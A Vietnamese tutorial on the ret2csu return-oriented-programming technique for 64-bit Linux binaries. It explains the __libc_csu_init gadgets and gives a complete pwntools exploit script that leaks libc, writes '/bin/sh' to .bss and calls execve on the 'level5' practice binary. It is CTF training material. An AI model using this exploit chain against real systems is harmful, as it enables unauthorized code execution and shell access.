### 1. Nguyên lý hoạt động

Trong các chương trình 64-bit, quy ước truyền tham số (calling convention) trên Linux (System V AMD64 ABI) quy định rằng 6 tham số đầu tiên của một hàm được truyền lần lượt qua các thanh ghi `rdi`, `rsi`, `rdx`, `rcx`, `r8`, và `r9`. Tuy nhiên, trong thực tế khi thực hiện tấn công ROP (Return-Oriented Programming), việc tìm kiếm các `gadget` phù hợp để kiểm soát toàn bộ các thanh ghi này thường rất khó khăn.

Đây là lúc kỹ thuật `ret2csu` phát huy tác dụng. Kỹ thuật này tận dụng các đoạn mã (`gadget`) có sẵn trong hàm `__libc_csu_init`. Hàm này được dùng để khởi tạo thư viện C (libc), và vì hầu hết mọi chương trình đều sử dụng libc, nên sự hiện diện của nó gần như được đảm bảo.

Hãy cùng phân tích mã assembly của hàm này (phiên bản có thể khác nhau đôi chút tùy vào trình biên dịch và phiên bản libc):

Code snippet

```Assembly
.text:00000000004005C0 ; void _libc_csu_init(void)
.text:00000000004005C0 public __libc_csu_init
.text:00000000004005C0 __libc_csu_init proc near
.text:00000000004005C0                 push    r15
.text:00000000004005C2                 push    r14
.text:00000000004005C4                 mov     r15d, edi
.text:00000000004005C7                 push    r13
.text:00000000004005C9                 push    r12
.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004005D2                 push    rbp
.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004005DA                 push    rbx
.text:00000000004005DB                 mov     r14, rsi
.text:00000000004005DE                 mov     r13, rdx
.text:00000000004005E1                 sub     rbp, r12
.text:00000000004005E4                 sub     rsp, 8
.text:00000000004005E8                 sar     rbp, 3
.text:00000000004005EC                 call    _init_proc
.text:00000000004005F1                 test    rbp, rbp
.text:00000000004005F4                 jz      short loc_400616
.text:00000000004005F6                 xor     ebx, ebx
.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]

.text:0000000000400600 loc_400600:
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600

.text:0000000000400616 loc_400616:
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
.text:0000000000400624 __libc_csu_init endp
```

Chúng ta có thể tận dụng các đoạn code sau:

1. **Từ `0x40061A` đến cuối hàm:** Đây là một chuỗi lệnh `pop` rất hữu ích. Khi khai thác lỗi `buffer overflow`, chúng ta có thể sắp xếp dữ liệu trên stack một cách có chủ đích để kiểm soát hoàn toàn giá trị của các thanh ghi `rbx`, `rbp`, `r12`, `r13`, `r14`, và `r15`.
    
2. **Từ `0x400600` đến `0x400609`:** Đoạn code này cho phép chúng ta gán giá trị từ các thanh ghi vừa kiểm soát được vào các thanh ghi dùng để truyền tham số: `rdx`, `rsi`, `rdi`.
    
    - `mov rdx, r13`
        
    - `mov rsi, r14`
        
    - `mov edi, r15d`
        
    - **Lưu ý quan trọng:** Mặc dù lệnh là `mov edi, r15d` (thao tác trên thanh ghi 32-bit), kiến trúc x86-64 sẽ tự động dọn sạch 32 bit cao của thanh ghi 64-bit tương ứng (`rdi`). Điều này có nghĩa là chúng ta có thể kiểm soát hoàn toàn `rdi`, miễn là giá trị nằm trong giới hạn 32-bit.
        
    - Sau đó là lệnh `call qword ptr [r12+rbx*8]`. Nếu chúng ta kiểm soát được `r12` và `rbx`, ta có thể gọi một hàm bất kỳ. Ví dụ, ta có thể đặt `rbx = 0` và `r12` là địa chỉ của hàm cần gọi (chẳng hạn địa chỉ trong bảng GOT - Global Offset Table).
        
3. **Từ `0x40060D` đến `0x400614`:** Đây là một vòng lặp được điều khiển bởi `rbx` và `rbp`. Để vòng lặp chỉ chạy đúng một lần và không nhảy lại địa chỉ `loc_400600`, ta cần thỏa mãn điều kiện `rbx` bằng `rbp` sau khi thực hiện `add rbx, 1`. Cách đơn giản nhất là thiết lập giá trị ban đầu: `rbx = 0` và `rbp = 1`.
    

### 2. Ví dụ minh họa

Chúng ta sẽ sử dụng bài `level5` trong series "step-by-step ROP" để minh họa.

Đầu tiên, kiểm tra các cơ chế bảo vệ của chương trình:

Bash

```
➜  ret2__libc_csu_init git:(iromise) ✗ checksec level5
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Chương trình 64-bit, không có canary, không có PIE, nhưng đã bật bảo vệ NX (Stack không thể thực thi).

Phân tích mã nguồn, ta thấy hàm `vulnerable_function` có một lỗ hổng `buffer overflow` đơn giản:

C

```
ssize_t vulnerable_function(){
  char buf; // [sp+0h] [bp-80h]@1
  return read(0, &buf, 0x200uLL); // Cho phép đọc tới 0x200 bytes vào một buffer chỉ có 0x80 bytes
}
```

Chương trình không có sẵn hàm `system` hay chuỗi `/bin/sh`. Vì vậy, chúng ta cần tự xây dựng chuỗi ROP để thực hiện mục tiêu. Ở đây, chúng ta sẽ dùng `execve` để lấy shell.

**Hướng tấn công cơ bản như sau:**

1. **Leak địa chỉ hàm `write`:** Tận dụng `buffer overflow` để thực thi `csu_gadgets`, gọi hàm `write(1, write_got, 8)` để in ra địa chỉ thực của hàm `write` từ bảng GOT. Sau đó, làm chương trình quay trở lại hàm `main` để khai thác lần nữa.
    
2. **Tính toán địa chỉ libc:** Dựa vào địa chỉ `write` vừa leak được, sử dụng công cụ như `LibcSearcher` để xác định phiên bản libc đang được sử dụng và tính toán địa chỉ của `execve`.
    
3. **Ghi `execve` và `/bin/sh` vào bộ nhớ:** Khai thác lần hai, dùng `csu_gadgets` để gọi hàm `read(0, bss_base, 16)`, ghi địa chỉ của `execve` và chuỗi `/bin/sh\x00` vào một vùng nhớ có quyền ghi, ví dụ như phân đoạn `.bss`.
    
4. **Gọi `execve` để lấy shell:** Khai thác lần cuối, dùng `csu_gadgets` để gọi `execve(bss_base + 8, 0, 0)`. Tham số đầu tiên là con trỏ đến chuỗi `/bin/sh` đã ghi trong `.bss`.
    

**Exploit script:**

Python

```
from pwn import *
from LibcSearcher import LibcSearcher

#context.log_level = 'debug'
level5 = ELF('./level5')
sh = process('./level5')

write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()

# Địa chỉ của 2 gadget chính trong __libc_csu_init
csu_front_addr = 0x0000000000400600 # mov rdx, r13; ...; call ...
csu_end_addr = 0x000000000040061A   # pop rbx, rbp, r12, r13, r14, r15; ret

fakeebp = b'b' * 8

def csu(rbx, rbp, r12, r13, r14, r15, last_addr):
    # payload để kiểm soát các thanh ghi thông qua chuỗi pop
    # rbx phải bằng 0
    # rbp phải bằng 1 để vòng lặp chỉ chạy 1 lần
    # r12 là địa chỉ hàm cần gọi (trong GOT)
    # r15 -> rdi (tham số 1)
    # r14 -> rsi (tham số 2)
    # r13 -> rdx (tham số 3)
    payload = b'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    
    # payload để thực thi lời gọi hàm và quay về địa chỉ mong muốn
    payload += p64(csu_front_addr)
    payload += b'a' * 0x38 # padding
    payload += p64(last_addr) # Địa chỉ ret về sau khi gadget kết thúc
    
    sh.send(payload)
    sleep(1)

sh.recvuntil('Hello, World\n')

## Giai đoạn 1: Leak địa chỉ write
# Gọi write(rdi=1, rsi=write_got, rdx=8)
csu(0, 1, write_got, 8, write_got, 1, main_addr)

write_addr = u64(sh.recv(8))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
execve_addr = libc_base + libc.dump('execve')
log.success('execve_addr ' + hex(execve_addr))

## Giai đoạn 2: Ghi execve_addr và '/bin/sh' vào .bss
sh.recvuntil('Hello, World\n')
# Gọi read(rdi=0, rsi=bss_base, rdx=16)
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + b'/bin/sh\x00') # Gửi payload cho hàm read

## Giai đoạn 3: Gọi execve
sh.recvuntil('Hello, World\n')
# Gọi hàm tại bss_base (chính là execve) với tham số là bss_base + 8 (chuỗi '/bin/sh')
# execve(rdi = bss_base + 8, rsi = 0, rdx = 0)
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)

sh.interactive()
```

### 3. Mở rộng và Tối ưu

#### Tối ưu payload

Payload tiêu chuẩn của chúng ta dài (0x80 padding + 8 ebp + 8 ret_addr + 6*8 thanh ghi + 8 ret_addr_2 + 0x38 padding + 8 last_addr = 184 bytes). Không phải lúc nào lỗ hổng cũng cho phép ghi một lượng dữ liệu lớn như vậy. Chúng ta có thể tối ưu bằng cách:

- **Tối ưu 1 - Kiểm soát `rbx` và `rbp` từ trước:** Nếu tìm được các `gadget` khác để thiết lập `rbx = 0` và `rbp = 1` trước, chúng ta có thể bỏ qua 2 giá trị này trong payload, tiết kiệm được 16 bytes.
    
- **Tối ưu 2 - Tận dụng lỗ hổng nhiều lần:** Ý tưởng là chia nhỏ payload. Thay vì thực hiện mọi thứ trong một lần, ta có thể gọi `csu_gadget` nhiều lần, mỗi lần thực hiện một phần nhiệm vụ. Tuy nhiên, cách này đòi hỏi điều kiện khắt khe hơn:
    
    - Lỗ hổng phải cho phép khai thác nhiều lần (ví dụ như chương trình quay về `main`).
        
    - Các thanh ghi `r12`-`r15` không bị thay đổi giữa các lần khai thác.
        

#### Các gadget khác và kỹ thuật offset

Ngoài `__libc_csu_init`, trình biên dịch GCC còn mặc định liên kết vào chương trình nhiều hàm khác như `_init`, `_start`, `_fini`, v.v. Chúng ta cũng có thể tìm kiếm `gadget` trong các hàm này.

Hơn nữa, CPU chỉ đơn giản là giải mã và thực thi bất kỳ byte mã máy nào được Program Counter (PC) trỏ tới. Do đó, chúng ta có thể "nhảy" vào giữa một lệnh hợp ngữ, tạo ra một lệnh hoàn toàn khác. Bằng cách này, ta có thể tìm thấy các `gadget` như `pop rdi; ret` hay `pop rsi; ret` ngay trong chuỗi `pop` của `__libc_csu_init` bằng cách bắt đầu thực thi từ một địa chỉ bị lệch đi vài byte (offset).

Ví dụ, phân tích đoạn cuối của `__libc_csu_init`:

```
// Chuỗi pop chuẩn bắt đầu tại 0x40061A
gef➤  x/5i 0x40061A
   0x40061a <__libc_csu_init+90>:	pop    rbx
   0x40061b <__libc_csu_init+91>:	pop    rbp
   0x40061c <__libc_csu_init+92>:	pop    r12
   0x40061e <__libc_csu_init+94>:	pop    r13
   0x400620 <__libc_csu_init+96>:	pop    r14

// Nhảy vào lệch 9 byte (0x40061A + 9 = 0x400623), ta có gadget pop rdi
gef➤  x/5i 0x40061A+9
   0x400623 <__libc_csu_init+99>:	pop    rdi
   0x400624 <__libc_csu_init+100>:	ret
   0x400625:	nop
   0x400626:	nop    WORD PTR cs:[rax+rax*1+0x0]
   0x400630 <__libc_csu_fini>:	repz ret
```

Việc hiểu rõ về mã hóa lệnh hợp ngữ cho phép chúng ta tìm kiếm `gadget` một cách sáng tạo hơn.
### 4. Tài liệu tham khảo

- [http://drops.xmd5.com/static/drops/papers-7551.html](http://drops.xmd5.com/static/drops/papers-7551.html)
- [http://drops.xmd5.com/static/drops/binary-10638.html](http://drops.xmd5.com/static/drops/binary-10638.html)
- [https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/)